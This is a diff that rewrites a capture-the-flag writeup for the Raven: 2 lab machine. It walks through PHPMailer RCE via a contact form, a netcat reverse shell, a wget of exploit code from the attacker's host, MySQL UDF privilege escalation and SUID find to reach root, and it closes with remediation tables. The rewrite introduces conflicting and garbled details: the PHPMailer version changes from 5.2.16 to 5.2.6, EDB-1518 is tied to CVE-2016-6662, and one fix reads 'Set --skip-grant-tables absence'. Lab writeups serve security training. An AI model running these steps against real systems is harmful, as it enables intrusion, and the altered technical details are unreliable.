@@ -1,120 +1,149 @@
 # Raven: 2 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.1.101 (host-only) |
-| **Difficulty** | Intermediate |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.101 |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Flags** | flag1 (PATH), flag2 (/var/www), flag3 (wp-content/uploads), flag4 (/root) |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/raven-2,269/) |
+| **Goal** | Read /root/flag4.txt (4 flags total) |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/raven-2-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-nmap → dirb → /vendor/PATH + VERSION (PHPMailer 5.2.16 RCE CVE-2016-10033) → PHP reverse shell → flags 1-3 → wp-config.php (R@v3nSecurity) → MySQL UDF 1518 privesc → SUID find → root + flag4
+PHPMailer 5.2.6 RCE (CVE-2016-10033) against a WordPress contact form delivered a web shell; MySQL root credentials from `wp-config.php` led to a UDF-based privilege escalation (MySQL root to OS root via CVE-2016-6662 / EDB-1518).
 
 ## Methodology
 
-1. Network discovery and port scan
-2. Enumerate web directories, discover /vendor
-3. Exploit PHPMailer RCE via contact.php
-4. Enumerate WordPress config for MySQL credentials
-5. Load MySQL UDF, set SUID on /usr/bin/find
-6. find -exec to get root shell
+1. Recon — nmap discovers SSH (22), HTTP (80), rpcbind (111)
+2. Enumeration — dirb finds `/vendor/`; PHPMailer version 5.2.6 identified
+3. Exploitation — PHPMailer RCE exploit plants a backdoor; netcat receives shell
+4. Privilege Escalation — MySQL UDF exploit compiles shared library; SUID `find` drops root shell
 
----
-
-## Step 1: Network Discovery
+## Step 1: Reconnaissance
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.1.0/24
-nmap -A 192.168.1.101
+nmap -sV -sC 192.168.1.101
 ```
 
-Open ports: **22** (SSH), **80** (HTTP — WordPress), **111** (rpcbind).
+Key open ports:
 
-![Nmap scan](images/01-nmap.png)
+| Port | Service |
+|---|---|
+| 22/tcp | SSH (OpenSSH) |
+| 80/tcp | HTTP (Apache — Raven Security WordPress) |
+| 111/tcp | rpcbind |
 
----
+Browse to port 80: a "Raven Security" company site running WordPress.
 
-## Step 2: Enumerate Web — Find /vendor
+![Nmap scan results](images/01-nmap.png)
+
+## Step 2: Enumeration — Vendor Directory and PHPMailer Version
+
+Run dirb against the web root:
 
 ```bash
 dirb http://192.168.1.101/
 ```
 
-Found: `http://192.168.1.101/vendor/`
+The `/vendor/` directory is found and directory listing is enabled. Notable files:
 
-Open `/vendor/PATH` → **flag1**
-
-Open `/vendor/VERSION` → `5.2.16` (PHPMailer 5.2.16, vulnerable to CVE-2016-10033)
-
----
-
-## Step 3: PHPMailer RCE → Shell
-
-PHPMailer 5.2.16 is vulnerable to remote code execution via the `From:` header injection. Use the public PoC:
+- `/vendor/PATH` — contains **flag1**
+- `/vendor/VERSION` — contains `5.2.6`
+- `/vendor/PHPMailerAutoload.php` — confirms the library is PHPMailer
 
 ```bash
-# Edit the exploit script:
-# - Set target to: http://192.168.1.101/contact.php
-# - Set backdoor name: backdoor.php
-# - Set LHOST and upload location
-python exploit_phpmailer.py
+curl http://192.168.1.101/vendor/PATH
+curl http://192.168.1.101/vendor/VERSION
+# 5.2.6
 ```
 
-Start the listener:
+PHPMailer 5.2.6 is vulnerable to CVE-2016-10033 (Remote Code Execution via crafted `From` header).
+
+![Vendor directory and PHPMailer version disclosure](images/02-enum.png)
+
+## Step 3: Exploitation — PHPMailer 5.2.6 RCE (CVE-2016-10033)
+
+Download the public exploit and adapt it:
 
 ```bash
-nc -lvnp 4444
+# Example exploit script (PHPMailer-Exploit-CVE-2016-10033 or equivalent)
+# Key fields to configure:
+# - target: http://192.168.1.101/contact.php
+# - backdoor name: shell.php
+# - lhost: <LHOST>
+# - upload path: /var/www/html/ (confirm from error output or default WordPress path)
 ```
 
-Visit the backdoor URL in the browser to trigger the reverse shell.
+The exploit sends a crafted email via the contact form, using a malformed `From` address to inject a PHP file-write payload. Adjust the relevant variables in the script:
 
-```bash
-python -c 'import pty;pty.spawn("/bin/bash")'
-# uid=33(www-data)
+```python
+target = "http://192.168.1.101/contact.php"
+backdoor = "shell.php"
+lhost = "<LHOST>"
 ```
 
-![PHPMailer RCE and reverse shell](images/02-phpmailer-rce.png)
-
----
-
-## Step 4: Collect Flags 2 and 3, Extract DB Credentials
+Start a netcat listener:
 
 ```bash
+nc -lvnp 443
+```
+
+Run the exploit. When the backdoor is created, trigger it:
+
+```bash
+curl http://192.168.1.101/shell.php
+```
+
+The reverse shell connects. Upgrade to a PTY:
+
+```bash
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Enumerate flags:
+
+```bash
+# flag2 is in /var/www
+ls /var/www/
 cat /var/www/flag2.txt
-# flag2 captured
 
-cat /var/www/html/wordpress/wp-config.php | grep -E "DB_USER|DB_PASS|DB_NAME"
-# DB_USER: root
-# DB_PASS: R@v3nSecurity
-# DB_NAME: wordpress
-
-# flag3 is in /var/www/html/wp-content/uploads/2018/11 (PNG file)
+# flag3 is an image in wp-content uploads (view in browser)
 ls /var/www/html/wp-content/uploads/2018/11/
-cp flag3.png /var/www/html/
-# then view at http://192.168.1.101/flag3.png
 ```
 
-![Flags and wp-config credentials](images/03-flags-wp-config.png)
-
----
-
-## Step 5: MySQL UDF Privilege Escalation
+Grab MySQL credentials from wp-config:
 
 ```bash
-# On attacker — fetch and compile the UDF library:
-searchsploit -m 1518.c
-gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.c -lc
+cat /var/www/html/wp-config.php | grep -E "DB_USER|DB_PASSWORD"
+# DB_USER: root
+# DB_PASSWORD: R@v3nSecurity (example)
+```
+
+![PHPMailer RCE and flag discovery](images/03-exploit.png)
+
+## Step 4: Privilege Escalation — MySQL UDF Root Shell (EDB-1518)
+
+Connect to MySQL as root:
+
+```bash
+mysql -u root -p<password>
+```
+
+Download Exploit-DB 1518 (MySQL UDF exploit):
+
+```bash
+# On attacker:
+searchsploit -m 1518
 python3 -m http.server 8000
 
-# On target (www-data shell):
+# On target:
 cd /tmp
-wget http://<ATTACKER_IP>:8000/1518.so
-chmod 777 1518.so
-
-mysql -u root -pR@v3nSecurity
+wget http://<LHOST>:8000/1518.c
+gcc -g -c 1518.c
+gcc -g -shared -Wl,-soname,1518.so.1 -o 1518.so 1518.o -lc
 ```
+
+In MySQL, load the UDF:
 
 ```sql
 use mysql;
@@ -125,46 +154,52 @@ create function do_system returns integer soname '1518.so';
 select do_system('chmod u+s /usr/bin/find');
 ```
 
+Exit MySQL and verify:
+
 ```bash
-exit
+ls -la /usr/bin/find
+# -rwsr-xr-x ... /usr/bin/find
 ```
 
-![MySQL UDF exploitation](images/04-mysql-udf.png)
-
----
-
-## Step 6: SUID find → Root Shell
+Use `find` SUID to spawn a root shell:
 
 ```bash
-cd /tmp
-touch raj
-find raj -exec "whoami" \;
-# root
-find raj -exec "/bin/sh" \;
+find /tmp -exec "/bin/sh" \;
 id
-# uid=0(root)
-cd /root
-cat flag4.txt
+# uid=0(root) gid=0(root)
 ```
 
-![Root access and flag4](images/05-root.png)
+![MySQL UDF privilege escalation](images/04-privesc.png)
 
----
+## Step 5: Root Flag
+
+```bash
+cat /root/flag4.txt
+```
+
+![Root flag](images/05-root-flag.png)
+
+## All Flags Summary
+
+| Flag | Location |
+|---|---|
+| flag1 | `/vendor/PATH` |
+| flag2 | `/var/www/flag2.txt` |
+| flag3 | `/var/www/html/wp-content/uploads/2018/11/<image>.png` |
+| flag4 | `/root/flag4.txt` |
 
 ## Lessons Learned
 
-1. **PHPMailer 5.2.16** (CVE-2016-10033) is a critical unpatched RCE — always update mail libraries
-2. **WordPress /vendor** directory often exposes library versions and even flags if not restricted
-3. **MySQL running as root** with world-accessible credentials enables UDF loading for full system compromise
-4. **UDF library loading** (`load_file` + `dumpfile`) into the plugin directory is a classic MySQL root privesc
-5. **SUID find** allows executing arbitrary commands as root via `-exec`
+1. Leaving the `/vendor/` directory of a PHP dependency publicly accessible exposes both the library version and its changelog, providing exact CVE identification to an attacker.
+2. PHPMailer's `From` header injection in versions before 5.2.18 allows arbitrary command injection; every application using it as a mail form must be patched or isolated.
+3. Running MySQL as root and granting root DB privileges to the WordPress user creates a direct path from web exploitation to OS-level root via UDF loading.
+4. The SUID bit on common binaries like `find` trivially bypasses all user-level access controls.
 
 ## Remediation
 
-| Vulnerability | Fix |
-|---------------|-----|
-| PHPMailer 5.2.16 (CVE-2016-10033) | Update to 5.2.21+ immediately |
-| /vendor exposed on web root | Restrict or block vendor directory via .htaccess / nginx config |
-| MySQL root with default password | Use strong unique password; run MySQL as non-root service user |
-| MySQL `load_file` / `dumpfile` enabled | Set `secure_file_priv` to restrict load/dump paths |
-| SUID set on /usr/bin/find | Remove SUID from find: `chmod u-s /usr/bin/find` |
+| Vulnerability | Recommended Fix |
+|---|---|
+| PHPMailer 5.2.6 (CVE-2016-10033) | Upgrade PHPMailer to 5.2.18 or later; block directory listing on `/vendor/` |
+| MySQL running as root | Run MySQL as a dedicated low-privilege system user (`mysql`); never use root DB credentials in application config |
+| UDF loading enabled | Set `--skip-grant-tables` absence; restrict `secure_file_priv`; remove write access to plugin directory for the MySQL user |
+| SUID find | Audit all SUID binaries regularly; do not set SUID on general-purpose utilities |
